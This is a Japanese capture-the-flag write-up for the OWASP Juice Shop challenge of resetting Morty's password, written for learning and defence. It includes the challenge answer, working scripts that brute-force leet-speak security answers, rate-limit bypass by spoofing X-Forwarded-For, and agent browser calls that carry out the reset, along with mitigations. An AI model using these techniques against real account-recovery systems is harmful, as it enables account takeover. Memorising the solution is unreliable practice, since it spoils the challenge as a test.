# Reset Morty's Password ✅

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** Broken Anti Automation
**目標:** 難読化されたセキュリティ回答を使ってMortyのパスワードをリセットする

## 思考プロセス

### 1. ユーザー特定

「Morty」は Rick and Morty のキャラクター、Morty Smith と推測。

### 2. セキュリティ質問の確認

- **Email**: `morty@juice-sh.op`
- **セキュリティ質問**: `Name of your favorite pet?` (お気に入りのペットの名前)

### 3. Rick and Morty の調査 (OSINT)

Rick and Morty Wiki によると:
- Morty の犬: **Snuffles** (後に **Snowball** と改名)
- エピソード: "Lawnmower Dog" (S1E2)
- 知能を高められた犬が自らを「Snowball」と改名

### 4. 難読化パターンの特定

チャレンジ説明に「obfuscated answer」とあるため、Leet speak を試行:
- `Snuffles` → 失敗
- `Snowball` → 失敗
- `5N0wb4ll` → 失敗
- **`5N0wb41L`** → **成功!**

### 5. レートリミットのバイパス

100リクエスト/5分のレート制限があるが、`X-Forwarded-For` ヘッダーで回避可能。

## 実行手順

### 方法1: API 直接呼び出し (推奨)

```javascript
// browser_evaluate を使用
async () => {
  const response = await fetch('/rest/user/reset-password', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Forwarded-For': '192.168.1.' + Math.floor(Math.random() * 255)
    },
    body: JSON.stringify({
      email: 'morty@juice-sh.op',
      answer: '5N0wb41L',
      new: 'newpassword123',
      repeat: 'newpassword123'
    })
  });
  return { status: response.status, body: await response.json() };
}
// 結果: { status: 200, body: { user: {...} } }
```

### 方法2: ブルートフォース スクリプト

レート制限をバイパスしながら全ての leet speak バリエーションを試行:

```python
import requests
import itertools

def leet_variations(word):
    substitutions = {
        'a': ['a', '4', '@'],
        'e': ['e', '3'],
        'i': ['i', '1', '!'],
        'o': ['o', '0'],
        's': ['s', '5', '$'],
        't': ['t', '7'],
        'l': ['l', '1', 'L'],
        'b': ['b', '8'],
    }
    # 各文字の可能なバリエーションを生成
    options = []
    for char in word.lower():
        if char in substitutions:
            options.append(substitutions[char])
        else:
            options.append([char, char.upper()])

    for combo in itertools.product(*options):
        yield ''.join(combo)

base_words = ['snowball', 'snuffles']
ip_counter = 0

for word in base_words:
    for variation in leet_variations(word):
        ip_counter += 1
        headers = {
            'Content-Type': 'application/json',
            'X-Forwarded-For': f'10.0.0.{ip_counter % 255}'
        }
        response = requests.post(
            'http://localhost:3000/rest/user/reset-password',
            headers=headers,
            json={
                'email': 'morty@juice-sh.op',
                'answer': variation,
                'new': 'password123',
                'repeat': 'password123'
            }
        )
        if response.status_code == 200:
            print(f"Success! Answer: {variation}")
            break
```

## コード/ペイロード

| 項目 | 値 |
|------|-----|
| Email | `morty@juice-sh.op` |
| Security Answer | `5N0wb41L` |
| Leet Speak Mapping | S→5, n→N, o→0, w→w, b→b, a→4, l→1, l→L |

## 解説

### 根本原因: 弱いセキュリティ質問 + レート制限不足

このチャレンジは複数の脆弱性を組み合わせている:

1. **推測可能なセキュリティ質問**:
   - 「ペットの名前」は公開情報から推測可能
   - Rick and Morty のファンなら Snuffles/Snowball は容易に推測できる

2. **不十分なレート制限**:
   - 100リクエスト/5分は制限として弱い
   - `X-Forwarded-For` ヘッダーで簡単にバイパス可能

3. **弱い難読化**:
   - Leet speak は予測可能なパターン
   - 辞書攻撃で短時間で突破可能

### なぜ X-Forwarded-For が効くのか

```
クライアント → プロキシ → サーバー

プロキシが X-Forwarded-For ヘッダーを追加して
「元のクライアントIP」を伝える想定

しかし:
- クライアントが直接このヘッダーを設定可能
- サーバーがヘッダーを検証せずに信頼
- 結果、レート制限のIPチェックを回避
```

### Leet Speak の危険性

```
元の単語: snowball
可能な変換:
  s → 5, $
  n → n
  o → 0
  w → w
  b → 8
  a → 4, @
  l → 1, !

総組み合わせ: 2^6 = 64 パターン程度
→ ブルートフォースで数秒で突破可能
```

### 対策

1. **セキュリティ質問を廃止**:
   - 代わりにメール/SMS による本人確認
   - TOTP などの2要素認証

2. **レート制限の強化**:
   - `X-Forwarded-For` を無条件に信頼しない
   - 接続元IPと組み合わせて判定
   - アカウント単位でもレート制限

3. **回答のハッシュ化**:
   - 回答を保存時にハッシュ化（Leet speak 変換は無効化）
   - 入力時も正規化してからハッシュ比較

## Playwright MCP での実行

```javascript
// 1. browser_evaluate でパスワードリセット API を呼び出し
mcp__playwright__browser_evaluate({
  function: `async () => {
    const response = await fetch('/rest/user/reset-password', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Forwarded-For': '192.168.1.' + Math.floor(Math.random() * 255)
      },
      body: JSON.stringify({
        email: 'morty@juice-sh.op',
        answer: '5N0wb41L',
        new: 'newpassword123',
        repeat: 'newpassword123'
      })
    });
    return { status: response.status, body: await response.json() };
  }`
});

// 2. チャレンジ解決を確認
mcp__playwright__browser_evaluate({
  function: "() => fetch('/api/Challenges').then(r => r.json()).then(d => d.data.find(c => c.key === 'resetPasswordMortyChallenge'))"
});
```

### 重要なポイント

- **UI では解けない**: レート制限があるため、API 直接呼び出しが必要
- **X-Forwarded-For**: 各リクエストで異なるIPを指定してレート制限回避
- **答えの形式**: `5N0wb41L` (大文字小文字も重要)

## 参考リンク

- [Rick and Morty Wiki - Snuffles](https://rickandmorty.fandom.com/wiki/Snuffles)
- [Juice Shop Write-up - Reset Morty's Password](https://github.com/Whyiest/Juice-Shop-Write-up/blob/main/5-stars/reset_morty_password.md)
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)

## ステータス

- [x] OSINT で Morty のペットを特定 (Snuffles/Snowball)
- [x] Leet speak バリエーションを特定 (`5N0wb41L`)
- [x] X-Forwarded-For でレート制限をバイパス
- [x] パスワードリセット成功
